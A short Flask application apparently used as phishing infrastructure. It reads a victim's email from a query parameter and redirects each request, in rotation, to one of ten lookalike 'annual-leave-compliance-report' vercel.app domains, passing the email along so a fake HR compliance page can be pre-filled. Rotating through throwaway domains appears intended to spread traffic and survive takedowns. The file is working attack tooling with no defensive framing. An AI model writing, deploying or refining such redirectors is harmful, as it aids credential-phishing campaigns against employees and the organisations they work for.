from flask import Flask, redirect, request
import os

app = Flask(__name__)

DOMAINS = [
	'https://annual-leave-compliance-report-2056.vercel.app',
	'https://annual-leave-compliance-report-205.vercel.app',
	'https://annual-leave-compliance-reports-944.vercel.app',
	'https://annual-leave-compliance-reports-966.vercel.app',
	'https://annual-leave-compliance-reports-113.vercel.app',
	'https://annual-leave-compliance-reports-122.vercel.app',
	'https://annual-leave-compliance-reports-221.vercel.app',
	'https://annual-leave-compliance-reports-233.vercel.app',
	'https://annual-leave-compliance-reports-311.vercel.app',
	'https://annual-leave-compliance-reports-323.vercel.app'
]

# Initialize counter
current_index = 0

@app.route('/')
def round_robin_balancer():
    global current_index
    
    email = request.args.get('web', '')
    
    # Basic email validation
    if not email or '@' not in email or '.' not in email:
        return "Invalid email. Use: ?web=youremail@example.com", 400
    
    # Get next domain in round-robin sequence
    target_domain = DOMAINS[current_index]
    
    # Increment index for next request
    current_index = (current_index + 1) % len(DOMAINS)
    
    # Construct target URL
    target_url = f"{target_domain}/?web={email}"
    
    # Instant redirect
    return redirect(target_url, code=302)

if __name__ == '__main__':
    app.run(debug=True)
